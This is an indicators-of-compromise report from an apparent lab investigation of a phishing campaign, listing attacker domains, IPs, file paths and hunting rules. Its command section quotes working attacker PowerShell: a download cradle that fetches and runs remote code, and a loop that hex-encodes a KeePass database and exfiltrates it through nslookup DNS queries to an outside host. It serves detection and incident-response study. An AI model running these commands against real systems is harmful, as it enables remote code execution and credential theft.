# Boogeyman 1 — Indicators of Compromise

This file lists observed indicators of compromise and investigation artifacts extracted from the Boogeyman 1 investigation. These indicators can support detection, hunting, scoping, and reporting.

Indicators should be verified and enriched as more evidence becomes available. Some artifacts, such as mail relay infrastructure and analyst-created reconstruction files, are included for investigation context but should not automatically be treated as malicious without additional validation.

---

## 1. Email Indicators

### Sender Email Address

```text
agriffin@bpakcaging.xyz
````

* **Description:** Sender address used in the phishing email.
* **Source:** `dump.eml` headers.
* **Confidence:** High.
* **Notes:** Observed in the `From`, `Reply-To`, `Sender`, and `Return-Path` headers.

### Targeted Recipient Email Address

```text
julianne.westcott@hotmail.com
```

* **Description:** Targeted recipient identified in the phishing email.
* **Source:** `dump.eml` headers.
* **Confidence:** High.
* **Notes:** Identified in the `To` header.

### Sender Domain

```text
bpakcaging.xyz
```

* **Description:** Domain used in the phishing sender address.
* **Source:** Email headers.
* **Confidence:** High.
* **Notes:** Also related to later attacker infrastructure observed in endpoint evidence.

### Tracking Domain

```text
tracking.bpakcaging.xyz
```

* **Description:** Tracking domain referenced in email headers, message ID, links, and tracking pixel.
* **Source:** `dump.eml`.
* **Confidence:** Medium.
* **Notes:** Useful for email investigation and correlation. Treat as suspicious in the context of this phishing campaign.

### Sender IP Address

```text
15.235.99.80
```

* **Description:** Sender IP address observed in email headers and SPF evaluation.
* **Source:** `dump.eml` `Received-SPF`, `Received`, and `X-Sender-IP` headers.
* **Confidence:** Medium.
* **Notes:** Observed as email sending infrastructure. Validate before blocking because infrastructure may be legitimate or abused.

### Mail Server Hostname

```text
pa80.mxout.mta1.net
```

* **Description:** Mail server observed in the email `Received` headers.
* **Source:** `dump.eml`.
* **Confidence:** Medium.
* **Notes:** Useful for mail-flow analysis and enrichment.

***

## 2. Mail Relay Infrastructure Observed

These domains were observed in email headers. They are not necessarily malicious by themselves.

### Elastic Email DKIM Domain

```text
elasticemail.com
```

* **Description:** DKIM signing domain observed in email headers.
* **Source:** `DKIM-Signature` header.
* **Confidence:** High observation confidence, low malicious confidence.
* **Notes:** Indicates the attacker likely used or abused legitimate email delivery infrastructure.

### Elastic Email Bounce/Unsubscribe Domain

```text
bounces.elasticemail.net
```

* **Description:** Bounce or unsubscribe infrastructure observed in email headers.
* **Source:** `List-Unsubscribe` header.
* **Confidence:** High observation confidence, low malicious confidence.
* **Notes:** Useful as email delivery context, but not necessarily malicious by itself.

***

## 3. Network Indicators

### File Hosting Domain

```text
files.bpakcaging.xyz
```

* **Description:** File hosting domain referenced by the decoded LNK payload and PowerShell logs.
* **Source:** Decoded PowerShell payload and `powershell.json`.
* **Confidence:** High.
* **Observed Usage:**
  * Hosted `/update` for the PowerShell download cradle.
  * Hosted `sq3.exe` during endpoint activity.

### Additional Attacker Infrastructure Domain

```text
cdn.bpakcaging.xyz
```

* **Description:** Additional attacker infrastructure observed in PowerShell logs.
* **Source:** `powershell.json`.
* **Confidence:** High.
* **Notes:** Related to the same suspicious `bpakcaging.xyz` infrastructure.

### DNS Exfiltration Subdomain Pattern

```text
<hex_chunk>.exfil.bpakcaging.xyz
```

* **Description:** DNS query pattern used during the exfiltration attempt.
* **Source:** PowerShell Event ID 4104, Record ID 774.
* **Confidence:** High.
* **Notes:** The attacker used chunks of hex-encoded data as DNS query subdomains.

### Download Cradle URL

```text
http://files.bpakcaging.xyz/update
```

* **Description:** Remote URL referenced by the decoded PowerShell download cradle.
* **Source:** Decoded PowerShell payload from the malicious LNK file.
* **Confidence:** High.

### sq3.exe Download URL

```text
http://files.bpakcaging.xyz/sq3.exe
```

* **Description:** URL used to download `sq3.exe` during endpoint activity.
* **Source:** `powershell.json`.
* **Confidence:** High.

### Exfiltration Destination IP Address

```text
167.71.211.113
```

* **Description:** Destination used during DNS-based exfiltration attempt.
* **Source:** `powershell.json`.
* **Confidence:** High.
* **Notes:** Observed in `nslookup` command activity.

***

## 4. File and Artifact Indicators

### Phishing Attachment

```text
Invoice.zip
```

* **Description:** Password-protected ZIP attachment delivered by phishing email.
* **Source:** Email attachment metadata.
* **Confidence:** High.

### Malicious Shortcut File

```text
Invoice_20230103.lnk
```

* **Description:** Shortcut file extracted from the ZIP archive.
* **Source:** ZIP extraction output.
* **Confidence:** High.
* **Notes:** Configured to launch PowerShell with hidden and encoded command-line arguments.

### Shortcut Icon Path

```text
C:\Users\Administrator\Desktop\excel.ico
```

* **Description:** Excel-related icon path referenced by the shortcut file.
* **Source:** `lnkparse` output.
* **Confidence:** Medium.
* **Notes:** Suggests the shortcut may have been disguised as an invoice or spreadsheet-related file.

### SQLite Utility

```text
sq3.exe
```

* **Description:** Downloaded SQLite utility used to query Sticky Notes data.
* **Source:** `powershell.json`.
* **Confidence:** High.

### Microsoft Sticky Notes Database

```text
plum.sqlite
```

* **Description:** Microsoft Sticky Notes database accessed by attacker.
* **Source:** `powershell.json`.
* **Confidence:** High.

### Sticky Notes Database Full Path

```text
C:\Users\j.westcott\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
```

* **Description:** Full path to the Sticky Notes database queried by the attacker.
* **Source:** `powershell.json`.
* **Confidence:** High.

### KeePass Database File

```text
protected_data.kdbx
```

* **Description:** KeePass database targeted for exfiltration.
* **Source:** `powershell.json`.
* **Confidence:** High.

### KeePass Database Full Path

```text
C:\Users\j.westcott\Documents\protected_data.kdbx
```

* **Description:** Full path to the targeted KeePass database.
* **Source:** `powershell.json`.
* **Confidence:** High.

***

## 5. Endpoint Indicators

### Compromised Workstation

```text
QL-WKSTN-5693
```

* **Description:** Compromised workstation observed in PowerShell logs.
* **Source:** `powershell.json`.
* **Confidence:** High.

### User Account

```text
j.westcott
```

* **Description:** User account associated with accessed paths and targeted files.
* **Source:** `powershell.json`.
* **Confidence:** High.

### Enumeration Tool

```text
Seatbelt.exe
```

* **Description:** Enumeration tool executed by attacker.
* **Source:** `powershell.json`.
* **Confidence:** High.

### PowerShell Seatbelt Script

```text
Invoke-Seatbelt.ps1
```

* **Description:** PowerShell version of Seatbelt referenced during attacker activity.
* **Source:** `powershell.json`.
* **Confidence:** High.

### Exfiltration Tool

```text
nslookup
```

* **Description:** Used during DNS-based exfiltration attempt.
* **Source:** `powershell.json`.
* **Confidence:** High.

***

## 6. Command and Execution Indicators

### Suspicious PowerShell Arguments

```powershell
-nop -windowstyle hidden -enc
```

* **Description:** Hidden and encoded PowerShell execution from malicious shortcut.
* **Source:** `lnkparse` output.
* **Confidence:** High.
* **Notes:** These arguments are commonly suspicious when observed together because they indicate stealthy encoded PowerShell execution.

### PowerShell Download Cradle

```powershell
iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
```

* **Description:** Downloads and executes remote PowerShell content.
* **Source:** Decoded LNK payload.
* **Confidence:** High.

### Seatbelt Enumeration Command

```powershell
Seatbelt.exe -group=user
```

* **Description:** User-focused host enumeration command.
* **Source:** `powershell.json`.
* **Confidence:** High.

### sq3.exe Download Command

```powershell
iwr http://files.bpakcaging.xyz/sq3.exe -outfile sq3.exe
```

* **Description:** Command used to download `sq3.exe`.
* **Source:** `powershell.json`.
* **Confidence:** High.

### Sticky Notes Query Command

```powershell
.\Music\sq3.exe AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite "SELECT * from NOTE limit 100"
```

* **Description:** Command used to query the Microsoft Sticky Notes database.
* **Source:** `powershell.json`.
* **Confidence:** High.

### KeePass File Read Method

```powershell
[System.IO.File]::ReadAllBytes($file)
```

* **Description:** Used to read the targeted KeePass database as bytes.
* **Source:** `powershell.json`.
* **Confidence:** High.

### Hex Encoding Command

```powershell
$hex = ($bytes | ForEach-Object { $_.ToString('x2') }) -join ''
```

* **Description:** Used to convert file bytes into hex format.
* **Source:** `powershell.json`.
* **Confidence:** High.

### DNS-Based Exfiltration Command

```powershell
for($i=0;$i -lt $hex.length; $i+=48){ $chunk = $hex.substring($i, :Min(48,$hex.length-$i)); nslookup "$chunk.exfil.bpakcaging.xyz" 167.71.211.113; } ;pwd
```

* **Description:** Loop used to split hex-encoded file content into chunks and send the chunks through DNS queries using `nslookup`.
* **Source:** `powershell.json`.
* **Confidence:** High.
* **Notes:** The command appears to use DNS queries as an exfiltration channel.

***

## 7. Phishing Artifacts

These artifacts are useful for investigation context but may not be suitable as direct blocking indicators.

### ZIP Password

```text
Invoice2023!
```

* **Description:** Password included in the phishing email body to open the encrypted ZIP archive.
* **Source:** Email body.
* **Notes:** Useful for understanding the phishing delivery method.

### Email Subject

```text
Collection for Quick Logistics LLC - Jan 2023
```

* **Description:** Invoice/payment-themed phishing lure.
* **Source:** Email headers and body.
* **Notes:** Useful for searching similar phishing emails.

### Reconstruction File

```text
payload.txt
```

* **Description:** Analyst-created file containing copied Base64 attachment content.
* **Source:** Investigation workspace.
* **Notes:** This is not a malicious IOC by itself. It is included as an investigation artifact.

***

## 8. Evidence Files

### Original Email

```text
dump.eml
```

* **Description:** Original phishing email file.

### Reconstructed ZIP Archive

```text
Invoice.zip
```

* **Description:** Reconstructed password-protected ZIP archive.

### Extracted Shortcut File

```text
Invoice_20230103.lnk
```

* **Description:** Shortcut file extracted from the ZIP archive.

### Shortcut Analysis Output

```text
lnkparse output
```

* **Description:** Output from analyzing `Invoice_20230103.lnk`.

### Endpoint PowerShell Log Source

```text
powershell.json
```

* **Description:** Endpoint PowerShell log source containing PowerShell Event ID 4104 records.

### Screenshots Folder

```text
screenshots/
```

* **Description:** Folder containing supporting evidence screenshots.

***

## 9. Hunting and Detection Notes

Potential detection and hunting opportunities:

* Alert on `powershell.exe` execution with `-enc`.
* Alert on `powershell.exe` execution with `-windowstyle hidden`.
* Hunt for PowerShell download cradle patterns using `Net.WebClient` and `DownloadString`.
* Hunt for `Invoke-Expression` or `iex` combined with remote URLs.
* Monitor HTTP requests to `files.bpakcaging.xyz`.
* Monitor downloads of `sq3.exe` from suspicious infrastructure.
* Hunt for `Seatbelt.exe` execution.
* Hunt for `Invoke-Seatbelt.ps1` references in PowerShell logs.
* Hunt for access to Sticky Notes database files such as `plum.sqlite`.
* Hunt for access to KeePass database files such as `.kdbx`.
* Alert on PowerShell usage of `[System.IO.File]::ReadAllBytes`.
* Alert on PowerShell byte-to-hex conversion behavior.
* Monitor `nslookup` usage with long subdomain queries.
* Monitor DNS queries containing `exfil.bpakcaging.xyz`.
* Search for inbound emails containing password-protected ZIP attachments.
* Search for emails with invoice/payment lures and passwords embedded in the message body.
* Search for LNK files delivered inside compressed archives.
* Hunt for suspicious use of `.lnk` files launching PowerShell.

***

## 10. Confidence Assessment

### Email Sender and Recipient

* **Confidence:** High.
* **Notes:** Observed directly in email headers.

### Mail Relay Infrastructure

* **Confidence:** High observation confidence, low malicious confidence.
* **Notes:** Observed in headers but not necessarily malicious by itself.

### File Artifacts

* **Confidence:** High.
* **Notes:** Observed through attachment reconstruction, ZIP extraction, LNK analysis, and endpoint logs.

### PowerShell Command Activity

* **Confidence:** High.
* **Notes:** Extracted from `lnkparse` output, decoded payload, and PowerShell Event ID 4104 records.

### Network URLs and Domains

* **Confidence:** High.
* **Notes:** Present in decoded PowerShell payload and PowerShell logs.

### Endpoint Host and User

* **Confidence:** High.
* **Notes:** Observed in endpoint PowerShell logs and file paths.

### Exfiltration Destination

* **Confidence:** High.
* **Notes:** Observed in PowerShell exfiltration activity.

### DNS Exfiltration Attempt

* **Confidence:** High for attempt, unknown for success.
* **Notes:** PowerShell command evidence shows an attempted DNS-based exfiltration using `nslookup`. Additional DNS or network logs are needed to confirm whether the transfer fully succeeded.
